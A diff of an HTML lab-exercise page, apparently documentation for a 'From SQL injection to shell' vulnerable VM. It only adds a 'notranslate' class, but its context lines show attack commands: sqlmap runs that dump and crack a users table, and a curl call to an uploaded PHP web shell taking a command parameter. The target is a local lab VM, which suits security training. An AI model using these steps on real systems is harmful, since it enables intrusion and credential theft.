@@ -216,8 +216,8 @@
 <p>The VM is provided as an iso file so should run on any virtualization platform. For configuration purposes the OS is Debian 6.0.5. The VM is called vulnerable and boots directly into a shell session.</p>
 <div class="section" id="manual-sql-injection">
 <h2>3.24.1. manual SQL injection<a class="headerlink" href="#manual-sql-injection" title="Permalink to this headline">¶</a></h2>
-<p>Download <a class="reference download internal" href="../_downloads/from_sql_injection_to_shell_exploit.sh" download=""><code class="xref download docutils literal"><span class="pre">from_sql_injection_to_shell_exploit.sh</span></code></a>, the manual, step-by-step command line script for the challenge. Run <code class="docutils literal"><span class="pre">./from_sql_injection_to_shell_exploit.sh</span> <span class="pre">IP</span></code> where IP is vulnerable’s IP address.</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env bash</span>
+<p>Download <a class="reference download internal" href="../_downloads/from_sql_injection_to_shell_exploit.sh" download=""><code class="xref download docutils literal notranslate"><span class="pre">from_sql_injection_to_shell_exploit.sh</span></code></a>, the manual, step-by-step command line script for the challenge. Run <code class="docutils literal notranslate"><span class="pre">./from_sql_injection_to_shell_exploit.sh</span> <span class="pre">IP</span></code> where IP is vulnerable’s IP address.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env bash</span>
 
 <span class="k">if</span> <span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$#</span><span class="s2">&quot;</span> !<span class="o">=</span> <span class="s2">&quot;1&quot;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
   <span class="nb">echo</span> <span class="nv">$0</span> IP
@@ -356,8 +356,8 @@ curl --silent http://<span class="nv">$TARGET</span>/admin/uploads/shell.php3?cm
 </div>
 <div class="section" id="exploit-simplification-with-sqlmap">
 <h2>3.24.2. exploit simplification with sqlmap<a class="headerlink" href="#exploit-simplification-with-sqlmap" title="Permalink to this headline">¶</a></h2>
-<p>Here is the much simpler <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a> approach. Change TARGET to vulnerable’s IP address. <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a> is run 4 times: (1) to verify SQL injection is possible; (2) to list available databases; (3) to list tables within a selected database; then (4) to dump the selected table (users). <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a> provided the added benefit of cracking the password found in the users table. We leave off the uploading of the exploitation php script which you can use from the last few lines of the command line script immediately above. Here is the <code class="docutils literal"><span class="pre">bash</span></code> code:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.102
+<p>Here is the much simpler <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a> approach. Change TARGET to vulnerable’s IP address. <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a> is run 4 times: (1) to verify SQL injection is possible; (2) to list available databases; (3) to list tables within a selected database; then (4) to dump the selected table (users). <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a> provided the added benefit of cracking the password found in the users table. We leave off the uploading of the exploitation php script which you can use from the last few lines of the command line script immediately above. Here is the <code class="docutils literal notranslate"><span class="pre">bash</span></code> code:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.102
 <span class="c1"># Check to see if sql injection possible</span>
 rm -rf sqlmap
 sqlmap --random-agent -u <span class="s2">&quot;http://</span><span class="nv">$TARGET</span><span class="s2">/cat.php?id=1&quot;</span> <span class="se">\</span>
@@ -373,8 +373,8 @@ sqlmap --random-agent -u <span class="s2">&quot;http://</span><span class="nv">$
     --batch --output-dir <span class="nv">$PWD</span>/sqlmap --dbms<span class="o">=</span>mysql -D photoblog -T users --dump
 </pre></div>
 </div>
-<p>And here is the output from running the <code class="docutils literal"><span class="pre">bash</span></code> code:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.102
+<p>And here is the output from running the <code class="docutils literal notranslate"><span class="pre">bash</span></code> code:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.102
 <span class="gp">hacker@kali:~$ #</span> Check to see <span class="k">if</span> sql injection possible
 <span class="gp">hacker@kali:~$</span> sqlmap --random-agent -u <span class="s2">&quot;http://</span><span class="nv">$TARGET</span><span class="s2">/cat.php?id=1&quot;</span> <span class="se">\</span>
     --batch --output-dir <span class="nv">$PWD</span>/sqlmap --dbms<span class="o">=</span>mysql
